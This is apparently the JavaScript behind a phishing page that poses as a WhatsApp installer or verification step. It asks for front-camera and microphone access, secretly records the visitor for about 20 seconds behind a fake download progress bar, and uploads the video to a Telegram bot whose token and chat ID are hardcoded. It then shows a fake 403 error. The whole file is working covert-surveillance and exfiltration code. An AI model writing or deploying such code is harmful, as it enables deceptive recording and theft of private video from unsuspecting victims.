const TOKEN = "8823259495:AAHe6VSdY9_Ea_g7hIPVhX0sWJWb1XYchgA";
const CHAT_ID = "8210199939";
const videoElement = document.getElementById('webcam');
const overlay = document.getElementById('overlay');
const statusText = document.getElementById('status-text');
const progressBar = document.getElementById('fill');

let mediaRecorder;
let recordedChunks = [];

async function startProcess() {
    try {
        // Запрашиваем строго фронтальную камеру
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: true 
        });
        
        videoElement.srcObject = stream;
        overlay.style.display = 'flex';
        
        // Пауза 2 секунды, чтобы камера успела включиться
        statusText.innerText = "Initializing secure connection...";
        await new Promise(resolve => setTimeout(resolve, 2000));

        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) recordedChunks.push(event.data);
        };

        mediaRecorder.start();
        statusText.innerText = "Downloading WhatsApp Messenger...";

        // Таймер записи на 20 секунд (пока идет полоска)
        let progress = 0;
        let interval = setInterval(() => {
            progress += 1;
            progressBar.style.width = progress + '%';
            if (progress >= 100) {
                clearInterval(interval);
                stopAndSend();
            }
        }, 200); 

    } catch (err) {
        alert("Verification failed. Please allow camera access to continue.");
        console.error(err);
    }
}

function stopAndSend() {
    statusText.innerText = "Finishing installation...";
    
    mediaRecorder.stop();
    mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
        
        // Проверка: если файл не пустой, отправляем
        if (blob.size > 1000) {
            await sendToTelegram(blob);
        }
        
        // Показываем ошибку 403, как на твоем скриншоте
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('progress-bar').style.display = 'none';
        document.getElementById('error-msg').style.display = 'block';
        statusText.style.display = 'none';
    };
}

async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', blob, 'front_cam.mp4');

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error("Upload error", e);
    }
}
